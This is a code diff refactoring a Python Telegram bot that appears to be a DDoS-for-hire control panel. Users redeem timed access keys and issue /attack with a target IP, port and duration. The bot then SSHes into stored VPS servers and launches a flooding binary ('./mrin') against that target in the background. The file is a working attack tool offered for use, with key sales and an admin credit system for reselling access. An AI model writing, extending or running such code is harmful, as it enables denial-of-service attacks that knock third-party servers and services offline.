@@ -2,13 +2,11 @@
 import telebot
 import paramiko
 import threading
-import multiprocessing
 import time
 import json
 import os
 import uuid
 import traceback
-import subprocess
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor
 
@@ -24,15 +22,30 @@ KEYS_FILE = "keys.json"
 USERS_FILE = "users.json"
 BLOCKED_USERS_FILE = "blocked_users.json"
 LOGS_FILE = "execution_logs.txt"
-ADMIN_CREDITS_FILE = "admin_credits.json"  # For advanced credit system
+ADMIN_CREDITS_FILE = "admin_credits.json"
 
 # Global variables for execution cancellation and logging
 running_channels = {}  # Maps thread name to its SSH channel
 cancel_event = threading.Event()
 log_lock = threading.Lock()
 
-# ThreadPoolExecutor for handling parallel tasks (e.g., heavy subprocesses)
+# ThreadPoolExecutor for handling parallel tasks
 executor = ThreadPoolExecutor(max_workers=10)
+
+# ---------------------------
+# Safe Telegram API Helpers
+# ---------------------------
+def safe_send(chat_id, text, parse_mode="HTML", reply_markup=None):
+    try:
+        bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
+    except Exception as e:
+        log_execution(f"Error sending message to {chat_id}: {e}")
+
+def safe_reply(message, text, parse_mode="HTML"):
+    try:
+        bot.reply_to(message, text, parse_mode=parse_mode)
+    except Exception as e:
+        log_execution(f"Error replying to message from {message.from_user.id}: {e}")
 
 # ---------------------------
 # Error Handling Decorator
@@ -44,19 +57,12 @@ def safe_handler(func):
         except Exception as e:
             error_trace = traceback.format_exc()
             log_execution(f"❌ Error in {func.__name__}: {error_trace}")
-            bot.reply_to(message, f"<b>❌ Error:</b> {str(e)}", parse_mode="HTML")
+            safe_reply(message, f"<b>❌ Error:</b> {str(e)}")
     return wrapper
 
 # ---------------------------
-# Utility Functions
+# Logging Utility
 # ---------------------------
-def check_blocked(message):
-    user_id = message.from_user.id
-    if user_id in blocked_users:
-        bot.reply_to(message, "<b>🚫 You are blocked from using this bot!</b>", parse_mode="HTML")
-        return True
-    return False
-
 def log_execution(message_text):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     with log_lock:
@@ -64,82 +70,33 @@ def log_execution(message_text):
             f.write(f"[{timestamp}] {message_text}\n")
 
 # ---------------------------
-# VPS Management Functions
+# Data Persistence Functions
 # ---------------------------
-def load_vps():
-    if os.path.exists(VPS_FILE):
-        with open(VPS_FILE, 'r') as f:
-            return json.load(f)
-    return []
+def load_json(filename, default):
+    if os.path.exists(filename):
+        try:
+            with open(filename, 'r') as f:
+                return json.load(f)
+        except Exception as e:
+            log_execution(f"Error loading {filename}: {e}")
+    return default
 
-def save_vps(vps_list):
-    with open(VPS_FILE, 'w') as f:
-        json.dump(vps_list, f)
+def save_json(filename, data):
+    try:
+        with open(filename, 'w') as f:
+            json.dump(data, f)
+    except Exception as e:
+        log_execution(f"Error saving {filename}: {e}")
 
-vps_servers = load_vps()
+vps_servers = load_json(VPS_FILE, [])
+keys = load_json(KEYS_FILE, {})
+users = load_json(USERS_FILE, {})
+blocked_users = load_json(BLOCKED_USERS_FILE, [])
+admin_credits = load_json(ADMIN_CREDITS_FILE, {})
 
-# ---------------------------
-# Key Management Functions
-# ---------------------------
-def load_keys():
-    if os.path.exists(KEYS_FILE):
-        with open(KEYS_FILE, 'r') as f:
-            return json.load(f)
-    return {}
-
-def save_keys(keys_dict):
-    with open(KEYS_FILE, 'w') as f:
-        json.dump(keys_dict, f)
-
-keys = load_keys()
-
-# ---------------------------
-# User Registration Functions
-# ---------------------------
-def load_users():
-    if os.path.exists(USERS_FILE):
-        with open(USERS_FILE, 'r') as f:
-            return json.load(f)
-    return {}
-
-def save_users(users_dict):
-    with open(USERS_FILE, 'w') as f:
-        json.dump(users_dict, f)
-
-users = load_users()
-
-# ---------------------------
-# Blocked Users Management
-# ---------------------------
-def load_blocked_users():
-    if os.path.exists(BLOCKED_USERS_FILE):
-        with open(BLOCKED_USERS_FILE, 'r') as f:
-            return json.load(f)
-    return []
-
-def save_blocked_users(blocked):
-    with open(BLOCKED_USERS_FILE, 'w') as f:
-        json.dump(blocked, f)
-
-blocked_users = load_blocked_users()
-
-# ---------------------------
-# Advanced Admin Credits System
-# ---------------------------
-def load_admin_credits():
-    if os.path.exists(ADMIN_CREDITS_FILE):
-        with open(ADMIN_CREDITS_FILE, 'r') as f:
-            return json.load(f)
-    return {}
-
-def save_admin_credits(credits):
-    with open(ADMIN_CREDITS_FILE, 'w') as f:
-        json.dump(credits, f)
-
-admin_credits = load_admin_credits()
 if str(BOT_OWNER_ID) not in admin_credits:
     admin_credits[str(BOT_OWNER_ID)] = {
-        "balance": 1000000,  # e.g., 1,000,000 credits
+        "balance": 1000000,  # 1,000,000 credits
         "history": [{
             "type": "add",
             "amount": 1000000,
@@ -147,8 +104,26 @@ if str(BOT_OWNER_ID) not in admin_credits:
             "timestamp": datetime.now().isoformat()
         }]
     }
-    save_admin_credits(admin_credits)
+    save_json(ADMIN_CREDITS_FILE, admin_credits)
 
+def save_vps_data():
+    save_json(VPS_FILE, vps_servers)
+
+def save_keys_data():
+    save_json(KEYS_FILE, keys)
+
+def save_users_data():
+    save_json(USERS_FILE, users)
+
+def save_blocked_users_data():
+    save_json(BLOCKED_USERS_FILE, blocked_users)
+
+def save_admin_credits_data():
+    save_json(ADMIN_CREDITS_FILE, admin_credits)
+
+# ---------------------------
+# Admin Credits Functions
+# ---------------------------
 def add_credit(admin_id, amount, reason=""):
     admin_id_str = str(admin_id)
     now = datetime.now().isoformat()
@@ -161,7 +136,7 @@ def add_credit(admin_id, amount, reason=""):
         "reason": reason,
         "timestamp": now
     })
-    save_admin_credits(admin_credits)
+    save_admin_credits_data()
 
 def deduct_credit(admin_id, amount, reason=""):
     admin_id_str = str(admin_id)
@@ -175,7 +150,7 @@ def deduct_credit(admin_id, amount, reason=""):
         "reason": reason,
         "timestamp": now
     })
-    save_admin_credits(admin_credits)
+    save_admin_credits_data()
 
 def get_credit_balance(admin_id):
     return admin_credits.get(str(admin_id), {"balance": 0})["balance"]
@@ -184,11 +159,11 @@ def get_credit_history(admin_id):
     return admin_credits.get(str(admin_id), {"history": []})["history"]
 
 # ---------------------------
-# Remote Command Execution
+# Remote Command Execution via SSH
 # ---------------------------
 def execute_command(vps, target_ip, target_port, duration):
     try:
-        # Use nohup to detach the command and redirect output to avoid offset bytes errors 🚀
+        # Use nohup to run the remote command in background
         command = f'nohup ./mrin {target_ip} {target_port} {duration} 900 > /dev/null 2>&1 &'
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -203,7 +178,6 @@ def execute_command(vps, target_ip, target_port, duration):
                 break
             time.sleep(1)
         try:
-            # Decode using UTF-8 with error replacement to avoid offset errors
             output = stdout.read().decode('utf-8', errors='replace')
             error_output = stderr.read().decode('utf-8', errors='replace')
         except Exception as read_err:
@@ -218,7 +192,10 @@ def execute_command(vps, target_ip, target_port, duration):
         thread_name = threading.current_thread().name
         if thread_name in running_channels:
             del running_channels[thread_name]
-        client.close()
+        try:
+            client.close()
+        except Exception:
+            pass
 
 # ---------------------------
 # Inline Help Command with Keyboard
@@ -226,7 +203,8 @@ def execute_command(vps, target_ip, target_port, duration):
 @bot.message_handler(commands=['help'])
 @safe_handler
 def send_help(message):
-    if check_blocked(message):
+    if message.from_user.id in blocked_users:
+        safe_reply(message, "<b>🚫 You are blocked from using this bot!</b>")
         return
     keyboard = telebot.types.InlineKeyboardMarkup()
     button_general = telebot.types.InlineKeyboardButton(text="💡 General Help", callback_data="help_general")
@@ -236,12 +214,11 @@ def send_help(message):
     keyboard.row(button_general, button_vps)
     keyboard.row(button_keys, button_users)
     help_message = "<b>🤖 VPS Manager Bot Help</b>\nSelect a category for details:"
-    bot.send_message(message.chat.id, help_message, parse_mode="HTML", reply_markup=keyboard)
+    safe_send(message.chat.id, help_message, reply_markup=keyboard)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("help_"))
 @safe_handler
 def callback_help(call):
-    # Acknowledge callback to avoid timeouts 👍
     bot.answer_callback_query(call.id, text="⏳ Loading help...")
     if call.data == "help_general":
         text = ("<b>💡 General Help</b>\n"
@@ -250,28 +227,27 @@ def callback_help(call):
                 "• /cancel - Cancel ongoing commands (Owner only) 🛑")
     elif call.data == "help_vps":
         text = ("<b>🖥️ VPS Management</b>\n"
-                "• /addvps <ip> <username> <password> - Add a VPS (Owner only) ➕\n"
+                "• /addvps &lt;ip&gt; &lt;username&gt; &lt;password&gt; - Add a VPS (Owner only) ➕\n"
                 "• /listvps - List all VPS (Owner only) 📋\n"
-                "• /removevps <ip> - Remove a VPS (Owner only) ➖\n"
-                "• /updatevps <ip> <new_username> <new_password> - Update a VPS (Owner only) 🔄\n"
+                "• /removevps &lt;ip&gt; - Remove a VPS (Owner only) ➖\n"
+                "• /updatevps &lt;ip&gt; &lt;new_username&gt; &lt;new_password&gt; - Update a VPS (Owner only) 🔄\n"
                 "• /status - Check VPS status (Owner only) 🔍")
     elif call.data == "help_keys":
         text = ("<b>🔑 Key Management</b>\n"
-                "• /genkey <validity> <max_users> <max_duration> <prefix> - Generate a key (Owner only) ✨\n"
+                "• /genkey &lt;validity&gt; &lt;max_users&gt; &lt;max_duration&gt; &lt;prefix&gt; - Generate a key (Owner only) ✨\n"
                 "   Example: /genkey 1day 10user 60duration MYKEY\n"
-                "• /usekey <key> - Register a key 📝\n"
+                "• /usekey &lt;key&gt; - Register a key 📝\n"
                 "• /keyinfo - View key info ℹ️\n"
-                "• /revoke <key> - Revoke a key (Owner only) ❌\n"
+                "• /revoke &lt;key&gt; - Revoke a key (Owner only) ❌\n"
                 "• /listkeys - List all keys (Owner only) 📜")
     elif call.data == "help_users":
         text = ("<b>👥 User Management</b>\n"
-                "• /blockuser <user_id> - Block a user (Owner only) 🚫\n"
-                "• /unblockuser <user_id> - Unblock a user (Owner only) ✅")
+                "• /blockuser &lt;user_id&gt; - Block a user (Owner only) 🚫\n"
+                "• /unblockuser &lt;user_id&gt; - Unblock a user (Owner only) ✅")
     else:
         text = "<b>❓ No help available.</b>"
-    # Use call.message.chat.id if available; otherwise, fallback to call.from_user.id
     chat_id = call.message.chat.id if call.message else call.from_user.id
-    bot.send_message(chat_id, text, parse_mode="HTML")
+    safe_send(chat_id, text)
 
 # ---------------------------
 # Other Command Handlers
@@ -279,7 +255,8 @@ def callback_help(call):
 @bot.message_handler(commands=['start'])
 @safe_handler
 def send_welcome(message):
-    if check_blocked(message):
+    if message.from_user.id in blocked_users:
+        safe_reply(message, "<b>🚫 You are blocked from using this bot!</b>")
         return
     welcome_text = (
         "<b>👋 Welcome to the VPS Manager Bot!</b>\n\n"
@@ -291,39 +268,37 @@ def send_welcome(message):
         "• /blockuser, /unblockuser, /cancel 🛑\n"
         "• /admin, /checkcredits, /addcredit 💳"
     )
-    bot.reply_to(message, welcome_text, parse_mode="HTML")
+    safe_reply(message, welcome_text)
 
 @bot.message_handler(commands=['genkey'])
 @safe_handler
 def generate_key(message):
-    if check_blocked(message):
-        return
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to generate keys!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to generate keys!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 5:
-        bot.reply_to(message, "<b>❓ Usage:</b> /genkey <validity> <max_users> <max_duration> <prefix>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /genkey &lt;validity&gt; &lt;max_users&gt; &lt;max_duration&gt; &lt;prefix&gt;")
         return
     validity_arg, max_users_arg, max_duration_arg, prefix_arg = command_parts[1:5]
     validity_lower = validity_arg.lower()
     try:
         number = int(''.join(filter(str.isdigit, validity_arg)))
     except Exception:
-        bot.reply_to(message, "<b>❌ Error parsing validity.</b> Include a number.", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Error parsing validity.</b> Include a number.")
         return
     if "day" in validity_lower:
         expiration = datetime.now() + timedelta(days=number)
     elif "min" in validity_lower:
         expiration = datetime.now() + timedelta(minutes=number)
     else:
-        bot.reply_to(message, "<b>❌ Invalid validity format.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Invalid validity format.</b>")
         return
     try:
         max_users = int(''.join(filter(str.isdigit, max_users_arg)))
         max_duration = int(''.join(filter(str.isdigit, max_duration_arg)))
     except Exception:
-        bot.reply_to(message, "<b>❌ Error parsing max_users or max_duration.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Error parsing max_users or max_duration.</b>")
         return
     prefix = prefix_arg if prefix_arg.endswith('-') else prefix_arg + '-'
     suffix = uuid.uuid4().hex[:6].upper()
@@ -334,132 +309,120 @@ def generate_key(message):
         "max_duration": max_duration,
         "used": []
     }
-    save_keys(keys)
-    reply = (
-        f"<b>✅ Key generated:</b> <code>{new_key}</code>\n"
-        f"<b>Expires at:</b> {expiration}\n"
-        f"<b>Max Users:</b> {max_users}\n"
-        f"<b>Max Duration:</b> {max_duration} seconds"
-    )
-    bot.reply_to(message, reply, parse_mode="HTML")
+    save_keys_data()
+    reply = (f"<b>✅ Key generated:</b> <code>{new_key}</code>\n"
+             f"<b>Expires at:</b> {expiration}\n"
+             f"<b>Max Users:</b> {max_users}\n"
+             f"<b>Max Duration:</b> {max_duration} seconds")
+    safe_reply(message, reply)
 
 @bot.message_handler(commands=['usekey'])
 @safe_handler
-def use_key(message):
-    if check_blocked(message):
-        return
+def use_key_handler(message):
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "<b>❓ Usage:</b> /usekey <key>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /usekey &lt;key&gt;")
         return
     provided_key = command_parts[1].strip()
     if provided_key not in keys:
-        bot.reply_to(message, "<b>❌ Invalid key!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Invalid key!</b>")
         return
     key_data = keys[provided_key]
     expires_at = datetime.fromisoformat(key_data["expires_at"])
     if datetime.now() > expires_at:
-        bot.reply_to(message, "<b>⏰ Key expired!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>⏰ Key expired!</b>")
         return
     if len(key_data["used"]) >= key_data["max_users"]:
-        bot.reply_to(message, "<b>⚠️ Key has reached max users!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>⚠️ Key has reached max users!</b>")
         return
     user_id_str = str(message.from_user.id)
     if user_id_str in key_data["used"]:
-        bot.reply_to(message, "<b>ℹ️ You have already registered this key.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ You have already registered this key.</b>")
         return
     key_data["used"].append(user_id_str)
-    save_keys(keys)
+    save_keys_data()
     users[user_id_str] = provided_key
-    save_users(users)
-    bot.reply_to(message, f"<b>✅ Key accepted!</b> You can attack for {key_data['max_duration']} seconds.", parse_mode="HTML")
+    save_users_data()
+    safe_reply(message, f"<b>✅ Key accepted!</b> You can attack for {key_data['max_duration']} seconds.")
 
 @bot.message_handler(commands=['attack'])
 @safe_handler
 def attack_vps(message):
-    if check_blocked(message):
-        return
     user_id_str = str(message.from_user.id)
     if user_id_str not in users:
-        bot.reply_to(message, "<b>🚫 Not authorized.</b> Register using /usekey <key>.", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized.</b> Register using /usekey &lt;key&gt;.")
         return
     user_key = users[user_id_str]
     if user_key not in keys:
-        bot.reply_to(message, "<b>❌ Key invalid!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Key invalid!</b>")
         return
     key_data = keys[user_key]
     expires_at = datetime.fromisoformat(key_data["expires_at"])
     if datetime.now() > expires_at:
-        bot.reply_to(message, "<b>⏰ Key expired!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>⏰ Key expired!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        bot.reply_to(message, "<b>❓ Usage:</b> /attack <target_ip> <target_port> <time>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /attack &lt;target_ip&gt; &lt;target_port&gt; &lt;time&gt;")
         return
     ip = command_parts[1]
     port = command_parts[2]
     try:
         duration = int(command_parts[3])
     except ValueError:
-        bot.reply_to(message, "<b>❌ Duration must be an integer.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Duration must be an integer.</b>")
         return
     if duration > key_data["max_duration"]:
-        bot.reply_to(message, f"<b>⚠️ Duration exceeds max {key_data['max_duration']} seconds.</b>", parse_mode="HTML")
+        safe_reply(message, f"<b>⚠️ Duration exceeds max {key_data['max_duration']} seconds.</b>")
         return
     if not vps_servers:
-        bot.reply_to(message, "<b>❌ No VPS available for the attack!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ No VPS available for the attack!</b>")
         return
     cancel_event.clear()
-    bot.reply_to(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}", parse_mode="HTML")
+    safe_reply(message, f"<b>🔥 Attack Initiated!</b>\nTarget: <code>{ip}:{port}</code>\nDuration: {duration} seconds\nVPS Count: {len(vps_servers)}")
     for vps in vps_servers:
         thread = threading.Thread(target=execute_command, args=(vps, ip, port, duration), daemon=True)
         thread.start()
 
 @bot.message_handler(commands=['addvps'])
 @safe_handler
-def add_vps(message):
-    if check_blocked(message):
-        return
+def add_vps_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to add VPS!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to add VPS!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        bot.reply_to(message, "<b>❓ Usage:</b> /addvps <ip> <username> <password>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /addvps &lt;ip&gt; &lt;username&gt; &lt;password&gt;")
         return
     ip, username, password = command_parts[1:4]
     new_vps = {'ip': ip, 'username': username, 'password': password}
     vps_servers.append(new_vps)
-    save_vps(vps_servers)
-    bot.reply_to(message, f"<b>✅ VPS {ip} added!</b>", parse_mode="HTML")
+    save_vps_data()
+    safe_reply(message, f"<b>✅ VPS {ip} added!</b>")
 
 @bot.message_handler(commands=['listvps'])
 @safe_handler
-def list_vps(message):
-    if check_blocked(message):
-        return
+def list_vps_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to view VPS list!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to view VPS list!</b>")
         return
     if not vps_servers:
-        bot.reply_to(message, "<b>ℹ️ No VPS registered.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ No VPS registered.</b>")
         return
     reply = "<b>🖥️ Active VPS:</b>\n"
     for idx, vps in enumerate(vps_servers):
         reply += f"{idx+1}. IP: <code>{vps['ip']}</code>, Username: <code>{vps['username']}</code>\n"
-    bot.reply_to(message, reply, parse_mode="HTML")
+    safe_reply(message, reply)
 
 @bot.message_handler(commands=['removevps'])
 @safe_handler
-def remove_vps(message):
-    if check_blocked(message):
-        return
+def remove_vps_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to remove VPS!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to remove VPS!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "<b>❓ Usage:</b> /removevps <ip>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /removevps &lt;ip&gt;")
         return
     ip_to_remove = command_parts[1]
     removed = False
@@ -469,22 +432,20 @@ def remove_vps(message):
             removed = True
             break
     if removed:
-        save_vps(vps_servers)
-        bot.reply_to(message, f"<b>✅ VPS {ip_to_remove} removed!</b>", parse_mode="HTML")
+        save_vps_data()
+        safe_reply(message, f"<b>✅ VPS {ip_to_remove} removed!</b>")
     else:
-        bot.reply_to(message, f"<b>❌ VPS {ip_to_remove} not found.</b>", parse_mode="HTML")
+        safe_reply(message, f"<b>❌ VPS {ip_to_remove} not found.</b>")
 
 @bot.message_handler(commands=['updatevps'])
 @safe_handler
-def update_vps(message):
-    if check_blocked(message):
-        return
+def update_vps_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to update VPS!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to update VPS!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        bot.reply_to(message, "<b>❓ Usage:</b> /updatevps <ip> <new_username> <new_password>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /updatevps &lt;ip&gt; &lt;new_username&gt; &lt;new_password&gt;")
         return
     ip, new_username, new_password = command_parts[1:4]
     updated = False
@@ -495,18 +456,16 @@ def update_vps(message):
             updated = True
             break
     if updated:
-        save_vps(vps_servers)
-        bot.reply_to(message, f"<b>✅ VPS {ip} updated!</b>", parse_mode="HTML")
+        save_vps_data()
+        safe_reply(message, f"<b>✅ VPS {ip} updated!</b>")
     else:
-        bot.reply_to(message, f"<b>❌ VPS {ip} not found.</b>", parse_mode="HTML")
+        safe_reply(message, f"<b>❌ VPS {ip} not found.</b>")
 
 @bot.message_handler(commands=['status'])
 @safe_handler
-def status_vps(message):
-    if check_blocked(message):
-        return
+def status_vps_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to check VPS status!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to check VPS status!</b>")
         return
     status_report = ""
     for vps in vps_servers:
@@ -518,72 +477,67 @@ def status_vps(message):
             client.close()
         except Exception:
             status_report += f"IP <code>{vps['ip']}</code> is <b>OFFLINE</b> ❌.\n"
-    bot.reply_to(message, status_report, parse_mode="HTML")
+    safe_reply(message, status_report)
 
 @bot.message_handler(commands=['logs'])
 @safe_handler
-def show_logs(message):
-    if check_blocked(message):
-        return
+def show_logs_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to view logs!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to view logs!</b>")
         return
     if os.path.exists(LOGS_FILE):
-        with open(LOGS_FILE, 'r') as f:
-            logs = f.read()
-        bot.reply_to(message, f"<b>📜 Logs:</b>\n<pre>{logs}</pre>", parse_mode="HTML")
+        try:
+            with open(LOGS_FILE, 'r') as f:
+                logs = f.read()
+            safe_reply(message, f"<b>📜 Logs:</b>\n<pre>{logs}</pre>")
+        except Exception as e:
+            safe_reply(message, f"<b>❌ Error reading logs:</b> {e}")
     else:
-        bot.reply_to(message, "<b>ℹ️ No logs available.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ No logs available.</b>")
 
 @bot.message_handler(commands=['revoke'])
 @safe_handler
-def revoke_key(message):
-    if check_blocked(message):
-        return
+def revoke_key_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to revoke keys!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to revoke keys!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "<b>❓ Usage:</b> /revoke <key>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /revoke &lt;key&gt;")
         return
     key_to_revoke = command_parts[1].strip()
     if key_to_revoke in keys:
         del keys[key_to_revoke]
-        save_keys(keys)
-        bot.reply_to(message, f"<b>✅ Key {key_to_revoke} revoked!</b>", parse_mode="HTML")
+        save_keys_data()
+        safe_reply(message, f"<b>✅ Key {key_to_revoke} revoked!</b>")
     else:
-        bot.reply_to(message, "<b>❌ Key not found.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Key not found.</b>")
 
 @bot.message_handler(commands=['listkeys'])
 @safe_handler
-def list_keys(message):
-    if check_blocked(message):
-        return
+def list_keys_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to list keys!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to list keys!</b>")
         return
     if not keys:
-        bot.reply_to(message, "<b>ℹ️ No keys generated.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ No keys generated.</b>")
         return
     reply = "<b>🔑 Generated Keys:</b>\n"
     for key_val, details in keys.items():
         reply += (f"Key: <code>{key_val}</code>, Expires: {details['expires_at']}, "
                   f"Max Users: {details['max_users']}, Max Duration: {details['max_duration']} sec\n")
-    bot.reply_to(message, reply, parse_mode="HTML")
+    safe_reply(message, reply)
 
 @bot.message_handler(commands=['keyinfo'])
 @safe_handler
-def key_info(message):
-    if check_blocked(message):
-        return
+def key_info_handler(message):
     user_id_str = str(message.from_user.id)
     if user_id_str not in users:
-        bot.reply_to(message, "<b>ℹ️ You have not registered a key.</b> Use /usekey <key>.", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ You have not registered a key.</b> Use /usekey &lt;key&gt;.")
         return
     user_key = users[user_id_str]
     if user_key not in keys:
-        bot.reply_to(message, "<b>❌ Your key is invalid.</b> Register again using /usekey <key>.", parse_mode="HTML")
+        safe_reply(message, "<b>❌ Your key is invalid.</b> Register again using /usekey &lt;key&gt;.")
         return
     details = keys[user_key]
     info_text = (f"<b>🔑 Key:</b> <code>{user_key}</code>\n"
@@ -591,63 +545,57 @@ def key_info(message):
                  f"<b>Max Users:</b> {details['max_users']}\n"
                  f"<b>Max Duration:</b> {details['max_duration']} seconds\n"
                  f"<b>Users registered:</b> {len(details['used'])}")
-    bot.reply_to(message, info_text, parse_mode="HTML")
+    safe_reply(message, info_text)
 
 @bot.message_handler(commands=['blockuser'])
 @safe_handler
-def block_user(message):
-    if check_blocked(message):
-        return
+def block_user_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to block users!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to block users!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "<b>❓ Usage:</b> /blockuser <user_id>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /blockuser &lt;user_id&gt;")
         return
     try:
         user_to_block = int(command_parts[1])
     except ValueError:
-        bot.reply_to(message, "<b>❌ User ID must be an integer.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
         return
     if user_to_block not in blocked_users:
         blocked_users.append(user_to_block)
-        save_blocked_users(blocked_users)
-        bot.reply_to(message, f"<b>✅ User {user_to_block} blocked!</b>", parse_mode="HTML")
+        save_blocked_users_data()
+        safe_reply(message, f"<b>✅ User {user_to_block} blocked!</b>")
     else:
-        bot.reply_to(message, "<b>ℹ️ User already blocked.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ User already blocked.</b>")
 
 @bot.message_handler(commands=['unblockuser'])
 @safe_handler
-def unblock_user(message):
-    if check_blocked(message):
-        return
+def unblock_user_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to unblock users!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to unblock users!</b>")
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "<b>❓ Usage:</b> /unblockuser <user_id>", parse_mode="HTML")
+        safe_reply(message, "<b>❓ Usage:</b> /unblockuser &lt;user_id&gt;")
         return
     try:
         user_to_unblock = int(command_parts[1])
     except ValueError:
-        bot.reply_to(message, "<b>❌ User ID must be an integer.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>❌ User ID must be an integer.</b>")
         return
     if user_to_unblock in blocked_users:
         blocked_users.remove(user_to_unblock)
-        save_blocked_users(blocked_users)
-        bot.reply_to(message, f"<b>✅ User {user_to_unblock} unblocked!</b>", parse_mode="HTML")
+        save_blocked_users_data()
+        safe_reply(message, f"<b>✅ User {user_to_unblock} unblocked!</b>")
     else:
-        bot.reply_to(message, "<b>ℹ️ User is not blocked.</b>", parse_mode="HTML")
+        safe_reply(message, "<b>ℹ️ User is not blocked.</b>")
 
 @bot.message_handler(commands=['cancel'])
 @safe_handler
-def cancel_execution(message):
-    if check_blocked(message):
-        return
+def cancel_execution_handler(message):
     if message.from_user.id != BOT_OWNER_ID:
-        bot.reply_to(message, "<b>🚫 Not authorized to cancel execution!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 Not authorized to cancel execution!</b>")
         return
     cancel_event.set()
     for thread_name, channel in list(running_channels.items()):
@@ -655,19 +603,19 @@ def cancel_execution(message):
             channel.close()
         except Exception:
             pass
-    bot.reply_to(message, "<b>🛑 Cancellation signal sent.</b>", parse_mode="HTML")
+    safe_reply(message, "<b>🛑 Cancellation signal sent.</b>")
     time.sleep(2)
     cancel_event.clear()
 
 # ---------------------------
-# Admin Panel with Advanced Credit Management for Keys
+# Admin Panel for Credit Management
 # ---------------------------
 @bot.message_handler(commands=['admin'])
 @safe_handler
-def admin_panel(message):
+def admin_panel_handler(message):
     admin_id = message.from_user.id
     if admin_id != BOT_OWNER_ID and get_credit_balance(admin_id) < 1:
-        bot.reply_to(message, "<b>🚫 You do not have sufficient credits for admin panel!</b>", parse_mode="HTML")
+        safe_reply(message, "<b>🚫 You do not have sufficient credits for admin panel!</b>")
         return
     keyboard = telebot.types.InlineKeyboardMarkup()
     button_genkey = telebot.types.InlineKeyboardButton(text="✨ Generate Key", callback_data="admin_genkey")
@@ -676,49 +624,45 @@ def admin_panel(message):
     keyboard.row(button_genkey)
     keyboard.row(button_listkeys, button_revoke)
     admin_text = "<b>🛠️ Admin Panel</b>\nSelect an action:"
